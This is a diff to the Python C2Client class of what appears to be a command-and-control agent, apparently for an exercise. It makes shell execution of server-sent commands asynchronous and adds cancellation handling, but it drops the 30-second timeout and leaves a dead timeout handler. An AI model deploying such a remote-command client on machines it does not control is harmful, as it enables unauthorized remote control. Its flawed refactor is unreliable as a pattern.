@@ -164,7 +164,7 @@ class C2Client:
         )
         
         try:
-            await asyncio.gather(*tasks, return_exceptions=True)
+            await asyncio.gather(*tasks)
         except asyncio.CancelledError:
             logger.info("Client main loop cancelled")
         finally:
@@ -255,7 +255,6 @@ class C2Client:
         """
         Execute commands from queue
         """
-        loop = asyncio.get_event_loop()
         try:
             while self.running:
                 # Get command with timeout
@@ -271,7 +270,7 @@ class C2Client:
                 
                 logger.info(f"Executing: {command}")
                 
-                start_time = time.time()
+                start_time = time.monotonic()
                 
                 if command == CommandType.KILL.value:
                     logger.info("Kill command received, exiting")
@@ -283,13 +282,9 @@ class C2Client:
                 
                 else:
                     # Run command asynchronously in thread pool
-                    result = await loop.run_in_executor(
-                        None,
-                        self._execute_bash_command,
-                        command
-                    )
+                    result = await self._execute_command(command)
                 
-                exec_time_ms = (time.time() - start_time) * 1000
+                exec_time_ms = (time.monotonic() - start_time) * 1000
                 
                 # Send result back to server
                 msg = Message.as_result(cmd_id, result, exec_time_ms)
@@ -313,7 +308,7 @@ class C2Client:
         except Exception as e:
             logger.error(f"Command processor error: {e}")
 
-    def _execute_bash_command(self, command: str) -> str:
+    async def _execute_command(self, command: str) -> str:
         """
         Execute bash-style command
         Supports pipes, redirects, etc.
@@ -322,21 +317,20 @@ class C2Client:
             # Use shell=True to support pipes, redirects
             # WARNING: this is a security risk in production
             # For testing/exercise, it's acceptable
-            result = subprocess.run(
+            process = await asyncio.create_subprocess_shell(
                 command,
-                shell=True,
-                capture_output=True,
-                timeout=30,
-                text=True
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
             )
             
             # Combine stdout and stderr
-            output = result.stdout
-            if result.stderr:
-                output += f"\n[stderr] {result.stderr}"
-            
+            stdout, stderr = await process.communicate()
+            output = stdout.decode() + (f"\n[stderr] {stderr.decode()}" if stderr else "")
             return output if output else "[No output]"
-        
+        except asyncio.CancelledError:
+            process.terminate()   # SIGTERM
+            await process.wait()
+            raise            
         except subprocess.TimeoutExpired:
             return "[Command timed out after 30s]"
         except Exception as e:
